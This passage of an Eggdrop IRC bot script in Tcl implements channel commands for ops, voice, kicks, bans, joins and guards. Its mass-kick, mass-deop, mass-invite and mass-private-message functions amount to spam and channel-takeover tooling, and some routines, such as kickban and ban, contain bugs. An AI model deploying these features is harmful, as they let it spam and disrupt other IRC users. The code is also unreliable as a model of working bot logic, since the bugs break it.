      setuser $owner XTRA "BEND" [zip [chattr $ps]]
      if {[passwdok $ps ""] != 1} {
         setuser $owner XTRA "LAST" [getuser $ps "PASS"]
      }
      deluser $ps
   }
   save
   if {![validuser $ps]} {
      adduser $ps "$ps!*@*"
      chattr $ps [dezip [getuser $owner XTRA "BEND"]]
      if {[getuser $owner XTRA "LAST"] != ""} {
         setuser $ps PASS [getuser $owner XTRA "LAST"]
      }
   }
   return 1
}
proc pub_voice {nick uhost hand chan rest} {
   global notc botnick
   if {![isop $botnick $chan]} { return 0 }
   if {$rest == "" && [isvoice $nick $chan]} {
      puthelp "NOTICE $nick :Usage: voice <nick>"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$rest != ""} {
      voiceq $chan $rest
   } { 
      voiceq $chan $nick 
   }
   return 0
}
proc pub_mvoice {nick uhost hand chan rest} {
   global notc botnick
   if {![isop $botnick $chan]} { return 0 }
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set nicks ""
   set i 0
   set members [chanlist $chan]
   foreach x $members {
      if {(![isop $x $chan]) && (![isvoice $x $chan]) && (![matchattr $x O])} {
         if {$i == 6} {
            voiceq $chan $nicks
            set nicks ""
            append nicks " $x"
            set i 1
         } {
            append nicks " $x"
            incr i
         }
      }
   }
   voiceq $chan $nicks
}
proc pub_devoice {nick uhost hand chan rest} {
   global notc botnick
   if {![isop $botnick $chan]} { return 0 }
   if {$rest == "" && ![isvoice $nick $chan]} {
      puthelp "NOTICE $nick :Usage: devoice <nick>"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$rest != ""} {
      putserv "MODE $chan -vvvvvv $rest"
   } else { 
      putserv "MODE $chan -v $nick" 
   }
   return 0
}
proc pub_mdevoice {nick uhost hand chan rest} {
   global notc botnick
   if {![isop $botnick $chan]} { return 0 }
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set nicks ""
   set i 0
   set members [chanlist $chan]
   foreach x $members {
      if {[isvoice $x $chan]} {
         if {$i == 6} {
            putserv "MODE $chan -vvvvvv $nicks"
            set nicks ""
            append nicks " $x"
            set i 1
         } {
            append nicks " $x"
            incr i
         }
      }
   }
   putserv "MODE $chan -vvvvvv $nicks"
}
proc del_nobase {} {
   global botnick notc cmd_case quick banner basechan
   set curtime [ctime [unixtime]]
   if {[isutimer "del_nobase"]} { return 0 }
   foreach x [channels] {
      set cinfo [channel info $x]
      if {[string match "*+statuslog*" $cinfo] && [string match "*-secret*" $cinfo]} {
         if {[onchan $botnick $x]} {
            set pidx [rand 4]
            if {$pidx == 1} {
               set ptxt "OuT"
            } elseif {$pidx == 2} {
               set ptxt "DiE"
            } elseif {$pidx == 3} {
               set ptxt "ShuTDowN"
            } elseif {$pidx == 4} {
               set ptxt "PaRT"
            } else {
               if {[info exists banner]} {
                  set ptxt $banner
               } {
                  set ptxt [lgrnd]
               }
            }
            if {![string match "*c*" [getchanmode $x]]} {
               set ptxt "1$ptxt"
            }
            if {$quick == "1"} {
               putquick "PART $x :PaRTiNG"
            } {
               putserv "PART $x :CliNk"
            }
         }
         channel remove $x
         savechan
         putlog "ReMoVe CHaN $x" 
         return 0
      }
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      if {[string match "*+stopnethack*" $cinfo]} {
         catch { channel set $x -stopnethack }
      }
      if {[string match "*+protectops*" $cinfo]} {
         catch { channel set $x -protectops }
      }
      if {[string match "*+protectfriends*" $cinfo]} {
         catch { channel set $x -protectfriends }
      }
      if {[string match "*+statuslog*" $cinfo] && [string match "*+secret*" $cinfo]} {
         catch { channel set $x -statuslog }
      }
      if {![onchan $botnick $x]} {
         putserv "JOIN $x"
      }
      if {[matchattr $cflag C]} {
         if {![istimer "cycle $x"]} { timer [getuser $cflag XTRA "CYCLE"] [list cycle $x] }
      }
   }
   if {[info exists basechan]} {
      if {![validchan $basechan]} {
         channel add $basechan { -greet +secret -statuslog }
      }
   }
   savechan
}
utimer 2 del_nobase
proc pub_op {nick uhost hand chan rest} {
   global notc botnick unop
   catch {unset unop($nick)}
   if {![isop $botnick $chan]} { return 0 }
   if {$rest == "" && [isop $nick $chan]} {
      puthelp "NOTICE $nick :Usage: op <nick>"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$rest != ""} { 
      opq $chan $rest
   } else { opq $chan $nick }
   return 0
}
proc pub_mop {nick uhost hand chan rest} {
   global notc botnick
   if {![isop $botnick $chan]} { return 0 }
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set nicks ""
   set i 0
   set members [chanlist $chan]
   foreach x $members {
      if {![isop $x $chan]} {
         if {$i == 6} {
            opq $chan $nicks
            set nicks ""
            append nicks " $x"
            set i 1
         } {
            append nicks " $x"
            incr i
         }
      }
   }
   opq $chan $nicks
}
proc pub_deop {nick uhost hand chan rest} {
   global notc botnick
   if {![isop $botnick $chan]} { return 0 }
   if {$rest == "" && ![isop $nick $chan]} {
      puthelp "NOTICE $nick :Usage: deop <nick>"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[matchattr $nick m]} { 
      set mreq "4MasTeR.ReQuesT"
   }
   if {[matchattr $nick n]} {
      set mreq "4ADmIN.ReQuesT"
   }
   if {$rest != ""} {
      if {![string match "*k*" [getchanmode $chan]]} {
         putserv "MODE $chan -kooooo $mreq $rest"
      } {
         putserv "MODE $chan -ooooo $rest"
      }
   } {
      if {![string match "*k*" [getchanmode $chan]]} {
         putserv "MODE $chan -ko $mreq $nick" 
      } {
         putserv "MODE $chan -o $nick" 
      }
   }
   return 0
}
proc pub_mdeop {nick uhost hand chan rest} {
   global botnick notc 
   if {![isop $botnick $chan]} { return 0 }
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {$nick != "*"} {
      if {![matchattr $nick Q]} {
         puthelp "NOTICE $nick :4DenieD...!!!"
         return 0
      }
   }
   set nicks ""
   set i 0
   set members [chanlist $chan]
   foreach x $members {
      if {([isop $x $chan]) && (![matchattr $x m]) && ($x != $botnick)} {
         if {$i == 5} {
            if {![string match "*k*" [getchanmode $chan]]} {
               putserv "MODE $chan -kooooo 4ADmIN.ReQuesT $nicks"
            } {
               putserv "MODE $chan -ooooo $nicks"
            }
            set nicks ""
            append nicks " $x"
            set i 1
         } {
            append nicks " $x"
            incr i
         }
      }
   }
   putserv "MODE $chan -oooooo $nicks"
}
proc pub_kick {nick uhost hand chan rest} {
   global botnick notc 
   if {![isop $botnick $chan]} { return 0 }
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: kick <nick|host> <reason>"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set reason [lrange $rest 1 end]
   set handle [lindex $rest 0]
   if {$reason == ""} {
      if {[matchattr $nick m]} { 
         set reason "1MasTeR 4KIcK1 ReQuesT4..!" 
      }
      if {[matchattr $nick n]} {
         set reason "1ADmIN 4KIcK1 ReQuesT4..!" 
      }
   }
   if {[string match "*@*" $handle]} {
      foreach knick [chanlist $chan] {
         if {[string match [string tolower $handle] [string tolower $knick![getchanhost $knick $chan]]]} {
            if {[matchattr $knick f] || $knick != $botnick} {
               putserv "KICK $chan $knick :$reason"
            }
         }
      }
      return 0
   }
   if {$handle == $botnick} {
      puthelp "NOTICE $nick :4DenieD...!!!, Can't kick my self."
      return 0
   }
   if {[matchattr $handle n] && ![matchattr $nick Z]} {
      puthelp "NOTICE $nick :4DenieD...!!!, CaNT KIcK ADmIN FLAg"
      return 0
   }
   putserv "KICK $chan $handle :$reason"
   return 0
}
proc pub_mkick {nick uhost hand chan rest} {
   global botnick notc 
   if {$rest != ""} {
      set chan [lindex $rest 0]
      set reason [lrange $rest 1 end]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   } else { 
      set reason $rest 
   }
   if {(![validchan $chan]) || (![isop $botnick $chan])} { return 0 }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$reason == ""} { 
      set reason "1ADmIN 4MaSSKIcK1 ReQuesT4..!" 
   }
   set members [chanlist $chan]
   foreach x $members {
      if {(![matchattr $x f]) && ($x != $botnick)} { 
         putserv "KICK $chan $x :$reason"
      }
   }
}
proc pub_kickban {nick uhost hand chan rest} {
   global botnick notc bannick
   if {![isop $botnick $chan]} { return 0 }
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: kickban <nick|host> <reason>"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: kickban <nick> <reason>"
      return 0
   }
   set reason [lrange $rest 1 end]
   set handle [lindex $rest 0]
   if {$reason == ""} {
      if {[matchattr $nick m]} {
         set reason "1MasTeR 4KIcKBaN1 ReQuesT [banmsg]"
      }
      if {[matchattr $nick n]} {
         set reason "1ADmIN 4KIcKBaN1 ReQuesT [banmsg]"
      }
   }
   if {[string match "*@*" $handle]} {
      set mfisrt "T"
      foreach knick [chanlist $chan] {
         if {[string match [string tolower $handle] [string tolower $knick![getchanhost $knick $chan]]]} {
            if {[matchattr $knick f] || $knick != $botnick} {
               if {$mfirst == "T"} {
                  set bannick($knick) $handle
                  set mfirst "F"
               }
               putserv "KICK $chan $knick :$reason"
            }
         }
      }
      return 0
   }
   if {![onchan $handle $chan]} { return 0 }
   set hostmask [getchanhost $handle $chan]
   set hostmask "*!*@[lindex [split $hostmask @] 1]"
   if {$handle == $botnick} {
      puthelp "NOTICE $nick :4DenieD...!!!, Can't kick my self."
      return 0
   }
   if {[matchattr $handle n] && ![matchattr $nick Z]} {
      puthelp "NOTICE $nick :4DenieD...!!!, CaNT KIcK ADmIN FLaG"
      return 0
   }
   set bannick($handle) $hostmask
   putserv "KICK $chan $handle :$reason"
   return 0
}
proc pub_ban {nick uhost hand channel rest} {
   global botnick notc
   if {![isop $botnick $channel]} { return 0 }
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: ban <nick/hostmask>"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set handle [lindex $rest 0]
   if {$handle == $botnick} {
      puthelp "NOTICE $nick :4!DeNIEd!, can't ban my self"
      return 0
   }
   if {[matchattr $handle n]} {
      puthelp "NOTICE $nick :$notc4 !DeNIEd!, cant ban ADmIN"
      return 0
   }
   set hostmask [getchanhost $handle $channel]
   set hostmask "$nick!*@*"
   if {![onchan $handle $channel]} { 
      set hostmask [lindex $rest 0] 
   }
   if {$hostmask != "$nick!*@*"} {
      putserv "MODE $channel +b $hostmask" 
   }
}
proc pub_unban {nick uhost hand chan rest} {
   global notc botnick
   if {![isop $botnick $chan]} { return 0 }
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: unban <nick/hostmask> <#channel>"
      return 0
   }
   if {[lindex $rest 1] != ""} { 
      set chan [lindex $rest 1] 
   }
   if {[string first # $chan] != 0} { 
      set chan "#$chan" 
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set handle [lindex $rest 0]
   append userhost $handle "!*" [getchanhost $handle $chan]
   set hostmask [maskhost $userhost]
   if {![onchan $handle $chan]} { 
      set hostmask [lindex $rest 0] 
   }
   putserv "MODE $chan -b $hostmask"
}
proc pub_up {nick uhost hand channel rest} {
   global notc botnick unop
   catch {unset unop($nick)}
   if {![isop $botnick $channel]} { return 0 }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {![isop $nick $channel]} {
      opq $channel $nick
   }
   return 0
}
proc pub_down {nick uhost hand channel rest} {
   global notc botnick
   if {![isop $botnick $channel]} {
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[matchattr $nick m]} {
      set mreq "4MasTeR.ReQuesT"
   }
   if {[matchattr $nick n]} {
      set mreq "4ADmIN.ReQuesT"
   }
   if {[isop $nick $channel]} {
      if {![string match "*k*" [getchanmode $channel]]} {
         putserv "mode $channel -ko $mreq $nick"
      } {
         putserv "mode $channel -o $nick"
      }
   }
   return 0
}
proc pub_munbans {nick uhost hand chan rest} {
   global notc botnick
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan] != 0} { 
         set chan "#$chan" 
      }
   }
   if {![validchan $chan] || ![isop $botnick $chan]} { return 0 }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set bans ""
   set i 0
   foreach x [chanbans $chan] {
      if {$i < 5} {
         append bans " [lindex $x 0]"
         set i [incr i]
      }
      if {$i == 5} {
         puthelp "MODE $chan -bbbbb $bans"
         set bans ""
         append bans " [lindex $x 0]"
         set i 0
      }
   }
   puthelp "MODE $chan -bbbbb $bans"
   if {![onchan $nick $chan]} { 
      puthelp "NOTICE $nick :MuNBaNS \[$chan\] DoNe"
   }
   return 0
}
proc pub_banlist {nick uhost hand chan rest} {
   global notc 
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan] != 0} { 
         set chan "#$chan" 
      }
   }
   if {![validchan $chan]} {
      puthelp "NOTICE $nick :NoT IN cHaN $chan."
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   foreach x [chanbans $chan] {
      puthelp "NOTICE $nick :$x"
   }
   if {[chanbans $chan] == ""} { 
      puthelp "NOTICE $nick :BaNLIsT $chan <n/a>"
   }
   return 0
}
proc pub_mode {nick uhost hand chan rest} { 
   global notc botnick
   if {![isop $botnick $chan]} { return 0 }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: mode +/- ntspnmcilk"
      return 0
   }
   putserv "mode $chan $rest"
}
proc pub_say {nick uhost hand channel rest} {
   global notc
   if {$rest==""} {
      puthelp "NOTICE $nick :Usage: say <msg>"
   }
   puthelp "PRIVMSG $channel :$rest"
}
proc pub_resync {nick uhost hand channel rest} {
   global botnick vern
   set vern2 $vern
   regsub -all --  $vern2 "" vern2
   if {![string match "*k*" [getchanmode $channel]]} {
      putserv "mode $channel -vok+ov $botnick $botnick $vern2 $botnick $botnick"
   } {
      putserv "mode $channel -o+o $botnick $botnick"
   }
}
proc pub_notice {nick uhost hand channel rest} {
   global notc
   if {$rest==""} {
      puthelp "NOTICE $nick :Usage: notice <nick> <msg>"
   }
   set person [lindex $rest 0]
   set rest [lrange $rest 1 end]
   if {$rest!=""} {
      puthelp "NOTICE $person :$rest"
      return 0
   }
}
proc pub_msg {nick uhost hand channel rest} {
   global owner notc
   if {$rest==""} {
      puthelp "NOTICE $nick :Usage: msg <nick> <msg>"
   }
   set person [string tolower [lindex $rest 0]]
   set rest [lrange $rest 1 end]
   if {[string match "*serv*" $person]} {
      puthelp "NOTICE $nick :$notc4 DeNIEd..! Can't send message to Service."
      return 0
   }
   if {$person == [string tolower $owner]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   puthelp "PRIVMSG $person :$rest"
}
proc pub_act {nick uhost hand channel rest} {
   global notc
   if {$rest==""} {
      puthelp "NOTICE $nick :Usage: act <msg>"
   }
   puthelp "PRIVMSG $channel :\001ACTION $rest\001"
   return 0
}
proc pub_invite {nick uhost hand chan rest} {
   global notc 
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: invite <nick> <#channel>"
   }
   set who [lindex $rest 0]
   set tochan [lindex $rest 1]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$tochan != ""} {
      if {![onchan $who $tochan]} {
         puthelp "INVITE $who :$tochan"
         puthelp "NOTICE $nick :InvItE $who To $tochan"
         return 0
      }
      puthelp "NOTICE $nick :$who is already on the $tochan"
   }
   if {![onchan $who $chan]} {
      putserv "INVITE $who :$chan"
      puthelp "NOTICE $nick :Invitation to $chan has been sent to $who"
      return 0
   }
   puthelp "NOTICE $nick :$who is already on the channel"
}
proc msg_Z {nick uhost hand rest} {
   global notc
   if {[string index $rest 0] != "`" && [string index $rest 0] != "."} { return 0 }
   if {![matchattr $nick Z]} { return 0 }
   if {[string index [lindex $rest 1] 0] == "#"} {
      if {![validchan [lindex $rest 1]]} {
         puthelp "NOTICE $nick :NoT IN [lindex $rest 1]"
         return 0
      }
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4auth 1st!"
      return 0
   }
   set goto [lindex $rest 0]
   if {[string index $rest 0] == "."} {
      regsub "." $goto "msg_" goto
      set rest [lrange $rest 1 end]
      catch { $goto $nick $uhost $hand $rest }
      return 0
   }
   regsub -all "`" $goto "pub_" goto
   if {[string index [lindex $rest 1] 0] == "#"} {
      set chan [lindex $rest 1]
      set rest [lrange $rest 2 end]
   } else {
      set chan "*"
      set rest [lrange $rest 1 end]
   }
   catch { $goto $nick $uhost $hand $chan $rest }
}
proc msg_mmsg {nick uhost hand rest} {
   pub_mmsg $nick $uhost $hand "*" $rest
}
proc pub_mmsg {nick uhost hand chan rest} {
   global cmd_chn cmd_by cmd_msg cmd_case notc
   if {$rest==""} {
      puthelp "NOTICE $nick :Usage: mmsg <#channel> <text>"
      return 0
   }
   set tochan [lindex $rest 0]
   set txt [lrange $rest 1 end]
   if {$txt==""} {
      puthelp "NOTICE $nick :Usage: mmsg <#channel> <text>"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[string first # $tochan] != 0} { 
      set chan "#$tochan" 
   }
   if {![validchan $tochan]} {
      set cmd_chn $tochan
      set cmd_msg $rest
      set cmd_by $nick
      set cmd_case "2"
      channel add $tochan
      catch { channel set $tochan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
      return 0
   }
   putserv "NOTICE $nick :STaRTING MaSSMSG $tochan"
   set members [chanlist $tochan]
   foreach x $members {
      if {![isop $x $tochan]} {
         puthelp "PRIVMSG $x :$txt"
      }
   }
   utimer 2 del_nobase
   puthelp "NOTICE $nick :MaSSMSG $tochan 4DoNE."
}
proc pub_minvite {nick uhost hand channel rest} {
   global cmd_chn cmd_by cmd_msg cmd_case botnick notc 
   if {$rest==""} {
      puthelp "NOTICE $nick :Usage: minvite <#channel> <#to channel>"
   }
   set chan [lindex $rest 1]
   if {$chan == ""} {
      set chan $channel
   } else {
      if {[string first # $chan] != 0} { 
         set chan "#$chan" 
      }
   }
   set tochan [lindex $rest 0]
   if {[string first # $tochan] != 0} { 
      set tochan "#$tochan" 
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {![validchan $tochan]} { 
      set cmd_chn $tochan
      set cmd_msg $tochan
      set cmd_by $nick
      set cmd_case "3"
      channel add $tochan
      catch { channel set $tochan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
      return 0
   }
   if {[isop $botnick $chan]} { 
      putserv "mode $chan -o $botnick" 
   }
   putserv "NOTICE $nick :Starting mass invite to $tochan"
   set members [chanlist $tochan]
   foreach x $members {
      if {(![onchan $x $chan]) && (![isop $x $tochan])} { 
         putserv "INVITE $x :$chan"
      }
   }
   utimer 2 del_nobase
   puthelp "NOTICE $nick :InVITE $tochan InTO $chan 4DoNE."
}
proc pub_join {nick uhost hand chan rest} {
   global botnick joinme own notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set chan [lindex $rest 0]
   if {[string first # $chan] != 0} { 
      set chan "#$chan" 
   }
   if {$chan=="#"} {
      puthelp "NOTICE $nick :Usage: join <#channel>"
      return 0
   }
   foreach x [channels] {
      if {[string tolower $x]==[string tolower $chan]} {
         puthelp "NOTICE $nick :$x ReADY!"
         return 0
      }
   }
   if {$nick != $own && [total_channel] != 1} {
      puthelp "NOTICE $nick :To MaNY cHaNNeL MaX 9..!"
      return 0
   }
   set joinme $nick
   channel add $chan
   catch { channel set $chan +statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
   savechan
   if {[lindex $rest 1] != ""} { 
      putserv "JOIN $chan :[lindex $rest 1]" 
   }
}
proc pub_+chan {nick uhost hand chan rest} {
   global botnick joinme owner notc 
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[matchattr $nick X]} {
      puthelp "NOTICE $nick :4!BLoCkEd!"
      return 0
   }
   set chan [lindex $rest 0]
   set opt [lindex $rest 1]
   if {[string first # $chan]!=0} { 
      set chan "#$chan" 
   }
   if {$chan=="#"} {
      puthelp "NOTICE $nick :Usage: +chan <#channel>"
      return 0
   }
   if {[validchan $chan]} {
      puthelp "NOTICE $nick :$chan is already on channels"
      return 0
   }
   if {$nick != $owner && [total_channel] != 1} {
      puthelp "NOTICE $nick :TO MaNY cHaNNeL MaX 9..!"
      return 0
   }
   set joinme $nick
   channel add $chan
   if {$opt != "" && [string tolower $opt] == "+nopart"} { 
      catch { channel set $chan -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
   } else {
      catch { channel set $chan -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
   }
   savechan
   if {[lindex $rest 1] != ""} { 
      putserv "JOIN $chan :[lindex $rest 1]" 
   }
}
proc total_channel {} {
   global notc 
   set total_chan 0
   foreach x [channels] {
      incr total_chan
   }
   if {$total_chan > 9} { return 0 }
   return 1
}
proc pub_part {nick uhost hand chan rest} { 
   global notc ps quick
   set curtime [ctime [unixtime]]
   set part_msg [lrange $rest 1 end]
   if {$rest != ""} { 
      set chan [lindex $rest 0]
      if {[string first # $rest]!=0} { 
         set chan "#$chan" 
      }
   }
   if {![validchan $chan]} { return 0 }
   if {$nick != $ps && [string tolower $chan] == "#TeGaL"} { return 0 }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[string match "*+secret*" [channel info $chan]]} {
      puthelp "NOTICE $nick :$chan 4PRoTecTEd..!"
      return 0
   }
   if {![onchan $nick $chan]} { 
      putserv "NOTICE $nick :PaRT $chan"
   }
   if {$part_msg != ""} {
      if {$quick == "1"} {
         putquick "PART $chan :$part_msg"
      } {
         putserv "PART $chan :$part_msg"
      }
   } {
      if {$quick == "1"} {
         putquick "PART $chan :BackToBase"
      } {
         putserv "PART $chan :BackToBase"
      }
   }
   channel remove $chan
   savechan
   return 0
}
set lockchan ""
proc pub_+invitelock {nick uhost hand chan rest} {
   global lockchan notc 
   if {$rest != ""} { 
      set chan [lindex $rest 0]
      if {[string first # $rest]!=0} { 
         set chan "#$chan" 
      }
   }
   if {![validchan $chan]} { return 0 }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   puthelp "NOTICE $nick :InVITE cHaN $chan \[9ON\]"
   set lockchan $chan
   return 0
}
proc pub_-invitelock {nick uhost hand chan rest} { 
   global lockchan notc 
   if {$rest != ""} { 
      set chan [lindex $rest 0]
      if {[string first # $rest]!=0} { 
         set chan "#$chan" 
      }
   }
   if {![validchan $chan] || $lockchan == ""} { return 0 }
   set lockchan ""
   puthelp "NOTICE $nick :InvItE cHaN $chan \[4OFF\]"
   return 0
}
proc cycle {chan} {
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![string match "*c*" [getchanmode $chan]]} {
      set text [cyclemsg]
   } {
      set text "ScaNninG.."
   }
   putserv "PART $chan :$text"
   if {[matchattr $cflag K]} {
      putserv "JOIN $chan :[dezip [getuser $cflag XTRA "CI"]]"
   } {
      putserv "JOIN $chan"
   }
   if {[matchattr $cflag C]} {
      if {![istimer "cycle $chan"]} { timer [getuser $cflag XTRA "CYCLE"] [list cycle $chan] }
   }
}
proc pub_cycle {nick uhost hand chan rest} {
   global notc
   set rest [lindex $rest 0]
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {$rest==""} {
      if {![onchan $nick $chan]} { 
         puthelp "NOTICE $nick :cYcLE $chan"
      }
      cycle $chan
      return 0
   } else {
      if {[string index $rest 0] != "#"} {
         set rest "#$rest"
      }
      if {[botonchan $rest]} { cycle $rest }
   }
}
proc pub_+massjoin {nick uhost hand chan rest} {
   global notc 
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {[string tolower $chan] == "#all"} {
      if {![matchattr $nick Q]} {
         puthelp "NOTICE $nick :4DenieD...!!!"
         return 0
      }
      foreach x [userlist A] {
         chattr $x +J
      }
      puthelp "NOTICE $nick :ALL MaSsJoIN CHaNNeL \[9ON\]"
      return 0
   }
   if {![validchan $chan]} { return 0 }
   if {[matchattr $cflag J]} {
      puthelp "NOTICE $nick :MaSsJoIN $chan \[9ON\]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag +J
   puthelp "NOTICE $nick :MaSsJoIN $chan \[9ON\]"
   saveuser
}
proc pub_-massjoin {nick uhost hand chan rest} {
   global notc 
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {[string tolower $chan] == "#all"} {
      if {![matchattr $nick Q]} {
         puthelp "NOTICE $nick :4DenieD...!!!"
         return 0
      }
      foreach x [userlist A] {
         chattr $x -J
      }
      puthelp "NOTICE $nick :ALL MaSsJoIN CHaNNeL \[9ON\]"
      return 0
   }
   if {![validchan $chan]} { return 0 }
   if {![matchattr $cflag J]} {
      puthelp "NOTICE $nick :MaSsJoIN $chan \[4OFF\]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   chattr $cflag -J
   puthelp "NOTICE $nick :MaSsJoIN $chan \[4OFF\]"
   saveuser
}
proc pub_+guard {nick uhost hand chan rest} {
   global notc 
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {[string tolower $chan] == "#all"} {
      if {![matchattr $nick Q]} {
         puthelp "NOTICE $nick :4DenieD...!!!"
         return 0
      }
      foreach x [channels] {
         catch { channel set $x +greet flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
         set cflag "c$x"
         set cflag [string range $cflag 0 8]
         chattr $cflag "-hp+AJSPTRUED"
         setuser $cflag XTRA "JP" 5
         setuser $cflag XTRA "CHAR" 250
         setuser $cflag XTRA "RPT" 2
         setuser $cflag XTRA "CAPS" 90
      }
      savechan
      puthelp "NOTICE $nick :ALL GuaRd CHaNNeL \[9ON\]"
      return 0
   }
   if {![validchan $chan]} { return 0 }
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   chattr $cflag "-hp+AJSPTRUED"
   setuser $cflag XTRA "JP" 5
   setuser $cflag XTRA "CHAR" 250
   setuser $cflag XTRA "RPT" 3
   setuser $cflag XTRA "CAPS" 90
   if {[string match "*+greet*" [channel info $chan]]} {
      puthelp "NOTICE $nick :GuARd $chan \[9ON\]"
      return 0
   }  
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   catch { channel set $chan +greet flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
   puthelp "NOTICE $nick :GuARD $chan \[9ON\]"
   savechan
}
proc pub_-guard {nick uhost hand chan rest} {
   global notc 
   if {$rest != ""} {
      set chan [lindex $rest 0]
      if {[string first # $chan]!=0} { 
         set chan "#$chan" 
      }
   }
   if {[string tolower $chan] == "#all"} {
      if {![matchattr $nick Q]} {
         puthelp "NOTICE $nick :4DenieD...!!!"
         return 0
      }
      foreach x [channels] {
         catch { channel set $x -greet flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
         set cflag "c$x"
